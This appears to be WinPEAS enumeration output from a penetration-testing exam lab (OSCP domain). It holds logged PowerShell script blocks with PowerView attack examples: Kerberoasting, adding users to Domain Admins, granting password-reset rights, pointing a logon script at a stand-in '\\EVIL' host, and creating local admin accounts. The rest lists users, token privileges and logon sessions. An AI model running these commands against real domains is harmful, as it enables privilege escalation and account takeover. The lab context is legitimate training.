   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Finds users who have RDP rights over WINDOWS4 through GPO correlation.
Get-DomainGPOComputerLocalGroupMapping -Domain dev.testlab.local -ComputerName WINDOWS4.dev.testlab.local -LocalGroup RDP
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOComputerLocalGroupMapping -Credential $Cred -ComputerIdentity SQL.testlab.local
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
the dev.testlab.local domain.
Find all computers that dfm user has local administrator rights to in
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOUserLocalGroupMapping -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Return any GPO-set groups for the GPO with the given display name.
Get-DomainGPOLocalGroup 'Desktops'
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPOLocalGroup -Credential $Cred
.LINK
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Get-DomainGPO -LDAPFilter '(!primarygroupid=513)' -Properties samaccountname,lastlogon
.EXAMPLE
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGPO -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Parse the GptTmpl.inf policy for the GPO with display name of 'testing'.
Get-DomainGPO testing | Get-GptTmpl
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-GptTmpl -Credential $Cred -GptTmplPath "\\dev.testlab.local\sysvol\dev.testlab.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"
Parse the default domain policy .inf for dev.testlab.local using alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns all distributed file system shares for the 'testlab.local' domain.
Get-DomainDFSShare -Domain testlab.local
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainDFSShare -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Removes harmj0y from 'Domain Admins' in the current domain.
Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
Removes harmj0y from 'Domain Admins' in the current domain using the alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Adds harmj0y to 'Domain Admins' in the current domain.
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
Adds harmj0y to 'Domain Admins' in the current domain using the alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
'CN=Enterprise Admins,CN=Users,DC=testlab,DC=local', 'Domain Admins' | Get-DomainGroupMember
.EXAMPLE
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroupMember -Credential
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Creates the 'TestGroup' group with the specified description.
New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.'
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
New-DomainGroup -SamAccountName TestGroup -Description 'This is a test group.' -Credential $Cred
Creates the 'TestGroup' group with the specified description using the specified alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=testlab,DC=local
objectguid            : f37903ed-b333-49f4-abaa-46c65e9cca71
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainGroup -Credential $Cred
.EXAMPLE
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Get-DomainSID -Domain testlab.local
.EXAMPLE
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSID -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Returns all subnets with linked to the specified group policy object.
Get-DomainSubnet -GPLink "F260B76D-55C8-46C5-BEF1-9016DD98E272"
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainSubnet -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Search for OUs with the specific names.
"*admin*","*server*" | Get-DomainOU
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainOU -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
resolves rights GUIDs to display names.
Finds interesting object ACLS in the ev.testlab.local domain and
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Find-InterestingDomainAcl -Credential $Cred -ResolveGUIDs
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        [no results returned]
Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}
$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid
ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential $Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!'-AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Enumerate the SACLs for all OUs in the domain, resolving GUIDs.
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs -Sacl
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObjectAcl -Credential $Cred -ResolveGUIDs
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Set the owner of 'dfm' in the current domain to 'harmj0y'.
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y -Credential $Cred
Set the owner of 'dfm' in the current domain to 'harmj0y' using the alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        \\primary\sysvol\blah.ps1
----------
scriptpath
ConvertTo-SecureString 'Password123!'-AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\EVIL\program2.exe'} -Credential $Cred -Verbose
VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!'-AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
CN=dfm (admin),CN=Users,DC=testlab,DC=local
OU=OU3,DC=testlab,DC=local
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainObject -Credential $Cred -Identity 'windows1'
.EXAMPLE
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Search the specified OU for computeres that allow unconstrained delegation.
Get-DomainComputer -SearchBase "LDAP://OU=secret,DC=testlab,DC=local" -Unconstrained
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainComputer -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Return all logon events from the last 3 days from every domain controller in the current domain.
Get-DomainController | Get-DomainUserEvent -StartTime ([DateTime]::Now.AddDays(-3))
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUserEvent -ComputerName PRIMARY.testlab.local -Credential $Cred -MaxEvents 1000
Return a max of 1000 logon events from the specified machine using the specified alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
for connection to the target domain.
A [Management.Automation.PSCredential] object of alternate credentials
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
New-DomainUser -SamAccountName harmj0y2 -Description 'This is harmj0y' -AccountPassword $UserPassword
Creates the 'harmj0y2' user with the specified description and password.
.EXAMPLE
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Find users who doesn't require Kerberos preauthentication and DON'T have an expired password.
Get-DomainUser -UACFilter DONT_REQ_PREAUTH,NOT_PASSWORD_EXPIRED
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
.EXAMPLE
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Get-ForestDomain -Forest external.local
.EXAMPLE
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-ForestDomain -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Get-Domain -Domain testlab.local
.EXAMPLE
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-Domain -Credential $Cred
.OUTPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
format instead of Hashcat.
Kerberoasts all found SPNs for the testlab.local domain, outputting to JTR
ConvertTo-SecureString 'Password123!' -AsPlainText -orce
$Cred = New-Object System.Management.Automation.PSCredential('TESTLB\dfm.a', $SecPassword)
Invoke-Kerberoast -Credential $Cred -Verbose -Domain testlab.local | fl
Kerberoasts all found SPNs for the testlab.local domain using alternate credentials.
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -orce

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.
.PARAMETER TokenHandle
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
$Token = Invoke-UserImpersonation -Credential $Cred
Invoke-RevertToSelf -TokenHandle $Token
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
Add-RemoteConnection -ComputerName 'PRIMARY.testlab.local' -Credential $Cred
$Cred = Get-Credential
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Add-RemoteConnection -Path '\\PRIMARY.testlab.local\C$\' -Credential $Cred
.EXAMPLE
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
CN=harmj0y,CN=Users,DC=testlab,DC=local
Convert-ADName -OutputType dn -Identity 'TESTLAB\harmj0y' -Server PRIMARY.testlab.local
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
'S-1-5-21-890171859-3433809279-3366196753-1108' | Convert-ADNAme -Credential $Cred
TESTLAB\harmj0y
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
'DEV\dfm','DEV\krbtgt' | ConvertTo-SID
.EXAMPLE
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
'TESTLAB\dfm' | ConvertTo-SID -Credential $Cred
.INPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
"C:\Windows\example.ini" | Get-IniContent
.EXAMPLE
ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-IniContent -Path \\PRIMARY.testlab.local\C$\Temp\GptTmpl.inf -Credential $Cred
.INPUTS
   Created At      :        2/21/2026 11:40:11 PM
   Command line    :        ConvertTo-SecureString 'Password123!' -AsPlainText -Force

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        else {
}
}
net_regiis.exe to use (it works with older versions)
$AspnetRegiisPath = Get-ChildItem -Path "$Env:SystemRoot\Microsoft.NET\Framework\" -Recurse -filter 'aspnet_regiis.exe'  | Sort-Object -Descending | Select-Object fullname -First 1
# Check if aspnet_regiis.exe exists
if (Test-Path  ($AspnetRegiisPath.FullName)) {
   Created At      :        2/21/2026 11:26:48 PM
   Command line    :        net_regiis.exe to use (it works with older versions)

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        # create a local user and add it to the local specified group
else {
}
net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
}
}
}
   Created At      :        2/21/2026 11:26:48 PM
   Command line    :        net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        # create a local user and add it to the local specified group
else {
}
net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
}
}
}
   Created At      :        2/21/2026 11:26:48 PM
   Command line    :        net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        # create a local user and add it to the local specified group
else {
}
net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")
}
}
}
   Created At      :        2/21/2026 11:26:48 PM
   Command line    :        net user $UserNameToAdd $PasswordToAdd /add", "net localgroup $LocalGroup $UserNameToAdd /add")

   =================================================================================================

   User Id         :        S-1-5-21-2481101513-2954867870-2660283483-1106
   Event Id        :        4104
   Context         :        .EXAMPLE
The new binary path (lpBinaryPathName) to set for the specified service. Required.
.PARAMETER Path
net user john Password123! /add'
Sets the binary path for 'VulnSvc' to be a command to add a user.
.EXAMPLE
Get-Service VulnSvc | Set-ServiceBinaryPath -Path 'net user john Password123! /add'
   Created At      :        2/21/2026 11:26:48 PM
   Command line    :        net user john Password123! /add'

   =================================================================================================


╔══════════╣ Displaying Power off/on events for last 5 days



════════════════════════════════════╣ Users Information ╠════════════════════════════════════

╔══════════╣ Users
╚ Check if you have some admin equivalent privileges https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#users--groups
  Current user: Administrator
  Current groups: Domain Users, Everyone, Local account and member of Administrators group, Administrators, Users, Remote Interactive Logon, Interactive, Authenticated Users, This Organization, Local account, Local, NTLM Authentication
   =================================================================================================

    WS26\Administrator: Built-in account for administering the computer/domain
        |->Groups: Administrators
        |->Password: CanChange-NotExpi-Req

    WS26\DefaultAccount(Disabled): A user account managed by the system.
        |->Groups: System Managed Accounts Group
        |->Password: CanChange-NotExpi-NotReq

    WS26\Guest(Disabled): Built-in account for guest access to the computer/domain
        |->Groups: Guests
        |->Password: NotChange-NotExpi-NotReq

    WS26\WDAGUtilityAccount(Disabled): A user account managed and used by the system for Windows Defender Application Guard scenarios.
        |->Password: CanChange-NotExpi-Req


╔══════════╣ Current User Idle Time
   Current User   :     WS26\Administrator
   Idle Time      :     00h:00m:55s:688ms

╔══════════╣ Display Tenant information (DsRegCmd.exe /status)
   Tenant is NOT Azure AD Joined.

╔══════════╣ Current Token privileges
╚ Check if you can escalate privilege using some enabled token https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#token-manipulation
    SeAssignPrimaryTokenPrivilege: DISABLED
    SeIncreaseQuotaPrivilege: DISABLED
    SeSecurityPrivilege: DISABLED
    SeTakeOwnershipPrivilege: DISABLED
    SeLoadDriverPrivilege: DISABLED
    SeSystemProfilePrivilege: DISABLED
    SeSystemtimePrivilege: DISABLED
    SeProfileSingleProcessPrivilege: DISABLED
    SeIncreaseBasePriorityPrivilege: DISABLED
    SeCreatePagefilePrivilege: DISABLED
    SeBackupPrivilege: DISABLED
    SeRestorePrivilege: DISABLED
    SeShutdownPrivilege: DISABLED
    SeDebugPrivilege: SE_PRIVILEGE_ENABLED
    SeSystemEnvironmentPrivilege: DISABLED
    SeChangeNotifyPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeRemoteShutdownPrivilege: DISABLED
    SeUndockPrivilege: DISABLED
    SeManageVolumePrivilege: DISABLED
    SeImpersonatePrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeCreateGlobalPrivilege: SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
    SeIncreaseWorkingSetPrivilege: DISABLED
    SeTimeZonePrivilege: DISABLED
    SeCreateSymbolicLinkPrivilege: DISABLED
    SeDelegateSessionUserImpersonatePrivilege: DISABLED



╔══════════╣ Logged users
    WS26\Administrator
    OSCP\r.andrews
    OSCP\g.jarvis

╔══════════╣ Display information about local users
   Computer Name           :   WS26
   User Name               :   Administrator
   User Id                 :   500
   Is Enabled              :   True
   User Type               :   Administrator
   Comment                 :   Built-in account for administering the computer/domain
   Last Logon              :   2/22/2026 2:28:43 AM
   Logons Count            :   29
   Password Last Set       :   10/9/2024 10:41:39 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   DefaultAccount
   User Id                 :   503
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed by the system.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   Guest
   User Id                 :   501
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   Built-in account for guest access to the computer/domain
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   1/1/1970 12:00:00 AM

   =================================================================================================

   Computer Name           :   WS26
   User Name               :   WDAGUtilityAccount
   User Id                 :   504
   Is Enabled              :   False
   User Type               :   Guest
   Comment                 :   A user account managed and used by the system for Windows Defender Application Guard scenarios.
   Last Logon              :   1/1/1970 12:00:00 AM
   Logons Count            :   0
   Password Last Set       :   10/9/2024 1:44:21 PM

   =================================================================================================


╔══════════╣ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    2                        r.andrews      OSCP                     Disconnected
    3         RDP-Tcp#0      Administrator  WS26                     Active    192.168.49.104

╔══════════╣ Ever logged users
    WS26\Administrator
    OSCP\r.andrews
    OSCP\g.jarvis

╔══════════╣ Home folders found
    C:\Users\Administrator : Administrators [Allow: AllAccess], Administrator [Allow: AllAccess]
    C:\Users\All Users : Administrators [Allow: AllAccess]
    C:\Users\Default : Administrators [Allow: AllAccess]
    C:\Users\Default User : Administrators [Allow: AllAccess]
    C:\Users\g.jarvis : Administrators [Allow: AllAccess]
    C:\Users\Public : Interactive [Allow: WriteData/CreateFiles], Administrators [Allow: AllAccess]
    C:\Users\r.andrews : Administrators [Allow: AllAccess]

╔══════════╣ Looking for AutoLogon credentials
    Not Found

╔══════════╣ Password Policies
╚ Check for a possible brute-force 
    Domain: Builtin
    SID: S-1-5-32
    MaxPasswordAge: 42.22:47:31.7437440
    MinPasswordAge: 00:00:00
    MinPasswordLength: 0
    PasswordHistoryLength: 0
    PasswordProperties: DOMAIN_LOCKOUT_ADMINS
   =================================================================================================

    Domain: WS26
    SID: S-1-5-21-2756297892-2186407355-380279769
    MaxPasswordAge: 42.00:00:00
    MinPasswordAge: 1.00:00:00
    MinPasswordLength: 7
    PasswordHistoryLength: 24
    PasswordProperties: DOMAIN_LOCKOUT_ADMINS
   =================================================================================================


╔══════════╣ Print Logon Sessions
    Method:                       LSA
    Logon Server:                 WS26
    Logon Server Dns Domain:      
    Logon Id:                     19665022
    Logon Time:                   2/22/2026 10:28:40 AM
    Logon Type:                   Network
    Start Time:                   
    Domain:                       WS26
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    Administrator
    User Principal Name:          
    User SID:                     S-1-5-21-2756297892-2186407355-380279769-500

   =================================================================================================

    Method:                       LSA
    Logon Server:                 DC20
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     19088729
    Logon Time:                   2/22/2026 10:12:39 AM
    Logon Type:                   Network
    Start Time:                   
    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    r.andrews
    User Principal Name:          r.andrews@oscp.exam
    User SID:                     S-1-5-21-2481101513-2954867870-2660283483-1106

   =================================================================================================

    Method:                       LSA
    Logon Server:                 WS26
    Logon Server Dns Domain:      
    Logon Id:                     14831453
    Logon Time:                   2/22/2026 9:19:21 AM
    Logon Type:                   RemoteInteractive
    Start Time:                   
    Domain:                       WS26
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    Administrator
    User Principal Name:          
    User SID:                     S-1-5-21-2756297892-2186407355-380279769-500

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      
    Logon Id:                     14806869
    Logon Time:                   2/22/2026 9:19:16 AM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Window Manager
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    DWM-3
    User Principal Name:          
    User SID:                     S-1-5-90-0-3

   =================================================================================================

    Method:                       LSA
    Logon Server:                 
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     14805946
    Logon Time:                   2/22/2026 9:19:16 AM
    Logon Type:                   Interactive
    Start Time:                   
    Domain:                       Font Driver Host
    Authentication Package:       Negotiate
    Start Time:                   
    User Name:                    UMFD-3
    User Principal Name:          WS26$@oscp.exam
    User SID:                     S-1-5-96-0-3

   =================================================================================================

    Method:                       LSA
    Logon Server:                 DC20
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     13722308
    Logon Time:                   2/22/2026 8:28:30 AM
    Logon Type:                   Network
    Start Time:                   
    Domain:                       OSCP
    Authentication Package:       NTLM
    Start Time:                   
    User Name:                    g.jarvis
    User Principal Name:          g.jarvis@oscp.exam
    User SID:                     S-1-5-21-2481101513-2954867870-2660283483-1105

   =================================================================================================

    Method:                       LSA
    Logon Server:                 DC20
    Logon Server Dns Domain:      oscp.exam
    Logon Id:                     13588790
    Logon Time:                   2/22/2026 8:20:34 AM
    Logon Type:                   Network
    Start Time:                   
